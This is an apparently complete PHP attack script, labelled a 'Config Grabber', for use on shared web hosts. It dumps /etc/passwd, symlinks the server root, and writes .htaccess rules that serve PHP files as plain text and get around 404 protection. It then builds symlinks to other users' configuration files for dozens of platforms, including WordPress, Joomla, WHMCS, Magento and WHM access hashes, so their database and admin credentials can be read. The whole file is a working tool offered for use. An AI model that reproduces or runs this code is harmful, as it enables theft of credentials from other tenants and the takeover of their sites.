<?php
###########################################################
#Config Grabber (Use Symlink Function + Bypass 404)       #
#Con7ext-Security.com                                     #
#Thanks: Xai Syndicate Team , 0x1999 , XnonGermx , And You#
###########################################################
if($_POST['asu']){
@mkdir("con7ext_sym404", 0777);
@chdir("con7ext_sym404");
@symlink("/","rintoar.txt");
$htaccess="Options Indexes FollowSymLinks
DirectoryIndex con7ext.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any
IndexIgnore *.txt404
RewriteEngine On
RewriteCond %{REQUEST_FILENAME} ^.*con7ext_sym404 [NC]
RewriteRule \.txt$ %{REQUEST_URI}404 [L,R=302.NC]";
@file_put_contents(".htaccess",$htaccess);
$passwd= $_POST['etcpasswd'];
$homes = $_POST['homess'];
preg_match_all('/(.*?):x:/', $passwd, $user_config);
foreach($user_config[1] as $user_con7ext) {
$grab_config = array(
"/$homes/$user_con7ext/.accesshash" => "WHM-accesshash",
"/$homes/$user_con7ext/public_html/config/koneksi.php" => "Lokomedia",
"/$homes/$user_con7ext/public_html/forum/config.php" => "phpBB",
"/$homes/$user_con7ext/public_html/sites/default/settings.php" => "Drupal",
"/$homes/$user_con7ext/public_html/config/settings.inc.php" => "PrestaShop",
"/$homes/$user_con7ext/public_html/app/etc/local.xml" => "Magento",
"/$homes/$user_con7ext/public_html/admin/config.php" => "OpenCart",
"/$homes/$user_con7ext/public_html/application/config/database.php" => "Ellislab",
"/$homes/$user_con7ext/public_html/vb/includes/config.php" => "Vbulletin",
"/$homes/$user_con7ext/public_html/includes/config.php" => "Vbulletin",
"/$homes/$user_con7ext/public_html/forum/includes/config.php" => "Vbulletin",
"/$homes/$user_con7ext/public_html/forums/includes/config.php" => "Vbulletin",
"/$homes/$user_con7ext/public_html/cc/includes/config.php" => "Vbulletin",
"/$homes/$user_con7ext/public_html/inc/config.php" => "MyBB",
"/$homes/$user_con7ext/public_html/includes/configure.php" => "OsCommerce",
"/$homes/$user_con7ext/public_html/shop/includes/configure.php" => "OsCommerce",
"/$homes/$user_con7ext/public_html/os/includes/configure.php" => "OsCommerce",
"/$homes/$user_con7ext/public_html/oscom/includes/configure.php" => "OsCommerce",
"/$homes/$user_con7ext/public_html/products/includes/configure.php" => "OsCommerce",
"/$homes/$user_con7ext/public_html/cart/includes/configure.php" => "OsCommerce",
"/$homes/$user_con7ext/public_html/inc/conf_global.php" => "IPB",
"/$homes/$user_con7ext/public_html/wp-config.php" => "Wordpress",
"/$homes/$user_con7ext/public_html/wp/test/wp-config.php" => "Wordpress",
"/$homes/$user_con7ext/public_html/blog/wp-config.php" => "Wordpress",
"/$homes/$user_con7ext/public_html/beta/wp-config.php" => "Wordpress",
"/$homes/$user_con7ext/public_html/portal/wp-config.php" => "Wordpress",
"/$homes/$user_con7ext/public_html/site/wp-config.php" => "Wordpress",
"/$homes/$user_con7ext/public_html/wp/wp-config.php" => "Wordpress",
"/$homes/$user_con7ext/public_html/WP/wp-config.php" => "Wordpress",
"/$homes/$user_con7ext/public_html/news/wp-config.php" => "Wordpress",
"/$homes/$user_con7ext/public_html/wordpress/wp-config.php" => "Wordpress",
"/$homes/$user_con7ext/public_html/test/wp-config.php" => "Wordpress",
"/$homes/$user_con7ext/public_html/demo/wp-config.php" => "Wordpress",
"/$homes/$user_con7ext/public_html/$homes/wp-config.php" => "Wordpress",
"/$homes/$user_con7ext/public_html/v1/wp-config.php" => "Wordpress",
"/$homes/$user_con7ext/public_html/v2/wp-config.php" => "Wordpress",
"/$homes/$user_con7ext/public_html/press/wp-config.php" => "Wordpress",
"/$homes/$user_con7ext/public_html/new/wp-config.php" => "Wordpress",
"/$homes/$user_con7ext/public_html/blogs/wp-config.php" => "Wordpress",
"/$homes/$user_con7ext/public_html/configuration.php" => "Joomla",
"/$homes/$user_con7ext/public_html/blog/configuration.php" => "Joomla",
"/$homes/$user_con7ext/public_html/submitticket.php" => "^WHMCS",
"/$homes/$user_con7ext/public_html/cms/configuration.php" => "Joomla",
"/$homes/$user_con7ext/public_html/beta/configuration.php" => "Joomla",
"/$homes/$user_con7ext/public_html/portal/configuration.php" => "Joomla",
"/$homes/$user_con7ext/public_html/site/configuration.php" => "Joomla",
"/$homes/$user_con7ext/public_html/main/configuration.php" => "Joomla",
"/$homes/$user_con7ext/public_html/$homes/configuration.php" => "Joomla",
"/$homes/$user_con7ext/public_html/demo/configuration.php" => "Joomla",
"/$homes/$user_con7ext/public_html/test/configuration.php" => "Joomla",
"/$homes/$user_con7ext/public_html/v1/configuration.php" => "Joomla",
"/$homes/$user_con7ext/public_html/v2/configuration.php" => "Joomla",
"/$homes/$user_con7ext/public_html/joomla/configuration.php" => "Joomla",
"/$homes/$user_con7ext/public_html/new/configuration.php" => "Joomla",
"/$homes/$user_con7ext/public_html/WHMCS/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/whmcs1/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/Whmcs/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/whmcs/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/whmcs/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/WHMC/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/Whmc/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/whmc/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/WHM/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/Whm/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/whm/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/HOST/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/Host/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/host/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/SUPPORTES/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/Supportes/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/supportes/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/domains/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/domain/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/Hosting/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/HOSTING/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/hosting/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/CART/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/Cart/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/cart/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/ORDER/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/Order/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/order/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/CLIENT/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/Client/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/client/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/CLIENTAREA/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/Clientarea/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/clientarea/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/SUPPORT/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/Support/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/support/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/BILLING/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/Billing/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/billing/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/BUY/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/Buy/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/buy/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/MANAGE/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/Manage/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/manage/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/CLIENTSUPPORT/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/ClientSupport/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/Clientsupport/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/clientsupport/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/CHECKOUT/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/Checkout/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/checkout/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/BILLINGS/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/Billings/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/billings/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/BASKET/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/Basket/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/basket/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/SECURE/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/Secure/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/secure/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/SALES/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/Sales/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/sales/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/BILL/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/Bill/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/bill/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/PURCHASE/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/Purchase/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/purchase/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/ACCOUNT/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/Account/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/account/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/USER/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/User/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/user/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/CLIENTS/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/Clients/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/clients/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/BILLINGS/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/Billings/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/billings/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/MY/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/My/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/my/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/secure/whm/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/secure/whmcs/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/panel/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/clientes/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/cliente/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/support/order/submitticket.php" => "WHMCS",
"/$homes/$user_con7ext/public_html/bb-config.php" => "BoxBilling",
"/$homes/$user_con7ext/public_html/boxbilling/bb-config.php" => "BoxBilling",
"/$homes/$user_con7ext/public_html/box/bb-config.php" => "BoxBilling",
"/$homes/$user_con7ext/public_html/host/bb-config.php" => "BoxBilling",
"/$homes/$user_con7ext/public_html/Host/bb-config.php" => "BoxBilling",
"/$homes/$user_con7ext/public_html/supportes/bb-config.php" => "BoxBilling",
"/$homes/$user_con7ext/public_html/support/bb-config.php" => "BoxBilling",
"/$homes/$user_con7ext/public_html/hosting/bb-config.php" => "BoxBilling",
"/$homes/$user_con7ext/public_html/cart/bb-config.php" => "BoxBilling",
"/$homes/$user_con7ext/public_html/order/bb-config.php" => "BoxBilling",
"/$homes/$user_con7ext/public_html/client/bb-config.php" => "BoxBilling",
"/$homes/$user_con7ext/public_html/clients/bb-config.php" => "BoxBilling",
"/$homes/$user_con7ext/public_html/cliente/bb-config.php" => "BoxBilling",
"/$homes/$user_con7ext/public_html/clientes/bb-config.php" => "BoxBilling",
"/$homes/$user_con7ext/public_html/billing/bb-config.php" => "BoxBilling",
"/$homes/$user_con7ext/public_html/billings/bb-config.php" => "BoxBilling",
"/$homes/$user_con7ext/public_html/my/bb-config.php" => "BoxBilling",
"/$homes/$user_con7ext/public_html/secure/bb-config.php" => "BoxBilling",
"/$homes/$user_con7ext/public_html/support/order/bb-config.php" => "BoxBilling",
"/$homes/$user_con7ext/public_html/includes/dist-configure.php" => "Zencart",
"/$homes/$user_con7ext/public_html/zencart/includes/dist-configure.php" => "Zencart",
"/$homes/$user_con7ext/public_html/products/includes/dist-configure.php" => "Zencart",
"/$homes/$user_con7ext/public_html/cart/includes/dist-configure.php" => "Zencart",
"/$homes/$user_con7ext/public_html/shop/includes/dist-configure.php" => "Zencart",
"/$homes/$user_con7ext/public_html/includes/iso4217.php" => "Hostbills",
"/$homes/$user_con7ext/public_html/hostbills/includes/iso4217.php" => "Hostbills",
"/$homes/$user_con7ext/public_html/host/includes/iso4217.php" => "Hostbills",
"/$homes/$user_con7ext/public_html/Host/includes/iso4217.php" => "Hostbills",
"/$homes/$user_con7ext/public_html/supportes/includes/iso4217.php" => "Hostbills",
"/$homes/$user_con7ext/public_html/support/includes/iso4217.php" => "Hostbills",
"/$homes/$user_con7ext/public_html/hosting/includes/iso4217.php" => "Hostbills",
"/$homes/$user_con7ext/public_html/cart/includes/iso4217.php" => "Hostbills",
"/$homes/$user_con7ext/public_html/order/includes/iso4217.php" => "Hostbills",
"/$homes/$user_con7ext/public_html/client/includes/iso4217.php" => "Hostbills",
"/$homes/$user_con7ext/public_html/clients/includes/iso4217.php" => "Hostbills",
"/$homes/$user_con7ext/public_html/cliente/includes/iso4217.php" => "Hostbills",
"/$homes/$user_con7ext/public_html/clientes/includes/iso4217.php" => "Hostbills",
"/$homes/$user_con7ext/public_html/billing/includes/iso4217.php" => "Hostbills",
"/$homes/$user_con7ext/public_html/billings/includes/iso4217.php" => "Hostbills",
"/$homes/$user_con7ext/public_html/my/includes/iso4217.php" => "Hostbills",
"/$homes/$user_con7ext/public_html/secure/includes/iso4217.php" => "Hostbills",
"/$homes/$user_con7ext/public_html/support/order/includes/iso4217.php" => "Hostbills"
);
foreach($grab_config as $config => $nama_config) {
$sym404=symlink($config, $user_con7ext."-".$nama_config.".txt");
if($sym404){
@mkdir($user_con7ext."-".$nama_config.".txt404", 0777);
$htaccess="
Options Indexes FollowSymLinks
DirectoryIndex con7ext.txt
Satisfy Any
";
@file_put_contents($user_con7ext."-".$nama_config.".txt404/.htaccess",$htaccess);

@symlink($config,$user_con7ext."-".$nama_config.".txt404/con7ext.txt");
}
}
}
echo "<center><a href='con7ext_sym404/'>Done...</a>";
}
else{
echo "<center><form method='POST' action=''><textarea name='etcpasswd' rows='20' cols='60'>";
echo include("/etc/passwd");
echo "</textarea><br>";
echo "Home: <input type='text' name='homess' value='home'><br>";
echo "<input type='submit' name='asu' value='Anjing!!'></form><br>";
}
?>
